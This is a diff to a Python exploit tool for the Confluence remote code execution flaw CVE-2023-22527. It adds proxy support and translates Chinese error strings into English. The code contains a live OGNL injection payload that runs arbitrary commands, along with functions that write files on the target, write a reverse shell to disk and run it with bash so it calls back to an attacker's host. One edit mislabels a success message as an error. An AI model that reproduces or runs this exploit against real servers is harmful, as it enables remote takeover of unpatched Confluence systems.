@@ -27,7 +27,7 @@ class CVE_2023_22527:
         try:
             urllib3.disable_warnings()
             url = urljoin(self.target, "/login.action")
-            res_v = requests.get(url=url, timeout= self.timeout)
+            res_v = requests.get(url=url, timeout= self.timeout, proxies=self.proxy)
             if res_v.status_code == 200:
                 ver = re.findall("<span id='footer-build-information'>.*</span>", res_v.text)
                 if len(ver) >= 1:
@@ -37,7 +37,7 @@ class CVE_2023_22527:
                     return self.target
 
         except requests.exceptions.RequestException as e:
-            return f"[!] 发生错误了:{str(e)}"    
+            return f"[!] An error occurred: {str(e)}"    
 
     def check(self):
         try:
@@ -49,21 +49,21 @@ class CVE_2023_22527:
             else:
                 return f"[-] {self.target}不存在confluence CVE-2023-26134 RCE"
         except requests.exceptions.RequestException as e:
-            return f"[!] 发生错误了:{str(e)}"
+            return f"[!] An error occurred: {str(e)}"
 
     def exploit(self, command):
         try:
             urllib3.disable_warnings()
             url = urljoin(self.target, self.path)
             exp = r"label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({'" + command + r"'}))"
-            res = requests.post(url=url, headers=self.header, data=exp, verify=self.verify, timeout=self.timeout)
+            res = requests.post(url=url, headers=self.header, data=exp, verify=self.verify, timeout=self.timeout, proxies=self.proxy)
             if res.status_code == 200 and 'X-Cmd-Response' in res.headers:
                 # print(res.headers.get("X-Cmd-Response"))
                 return res.headers.get("X-Cmd-Response")
             else:
                 return "Null"
         except requests.exceptions.RequestException as e:
-            return f"[!] 发生错误了:{str(e)}"
+            return f"[!] An error occurred: {str(e)}"
 
 
     def create_file(self, url, filename):
@@ -72,9 +72,9 @@ class CVE_2023_22527:
             write_file_data += "\\u0027ognl\\u0027).findValue(#parameters.poc[0],"
             write_file_data += "{})%2b\\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader("
             write_file_data += f"'X-Cmd-Response',(new+java.io.PrintWriter(new+java.io.FileWriter('{filename}',false))).printf('','').checkError())"
-            write_file_response = requests.post(url=url, headers=self.header, data=write_file_data, verify=self.verify, timeout=self.timeout)
+            write_file_response = requests.post(url=url, headers=self.header, data=write_file_data, verify=self.verify, timeout=self.timeout, proxies=self.proxy)
             if write_file_response.status_code == 200:
-                return f"[+] Create File: {filename}"
+                return f"[+] An error occurred: {filename}"
             else:
                 return f"[-] Create File: {filename} Failed"
         except requests.exceptions.RequestException as e:
@@ -87,10 +87,10 @@ class CVE_2023_22527:
             shell_command_data += "\\u0027ognl\\u0027).findValue(#parameters.poc[0],"
             shell_command_data += "{})%2b\\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader("
             shell_command_data += f"'X-Cmd-Response',(new+java.io.PrintWriter(new+java.io.FileWriter('{filename}',true))).printf('{shell_str}','').checkError())"
-            requests.post(url=url, headers=self.header, data=shell_command_data, verify=self.verify, timeout=self.timeout)
+            requests.post(url=url, headers=self.header, data=shell_command_data, verify=self.verify, timeout=self.timeout, proxies=self.proxy)
             return f"[+] Loop Write Reverse Shell To: {filename}"
         except requests.exceptions.RequestException as e:
-            return f"[!] 发生错误了:{str(e)}"
+            return f"[!] An error occurred: {str(e)}"
 
 
     def reverse(self, lhost, lport):
@@ -113,7 +113,7 @@ class CVE_2023_22527:
             reverse_data += f"'bash {file_name}'"
             reverse_data += "}))"
 
-            requests.post(url=url, headers=self.header, data=reverse_data, verify=self.verify, timeout=self.timeout)
+            requests.post(url=url, headers=self.header, data=reverse_data, verify=self.verify, timeout=self.timeout, proxies=self.proxy)
             result.append(f"[*] Reverse shell command executed. Check results on host {lhost}!")
         except requests.exceptions.ReadTimeout:
             result.append(f"[*] Reverse shell command executed. Check results on host {lhost}!")
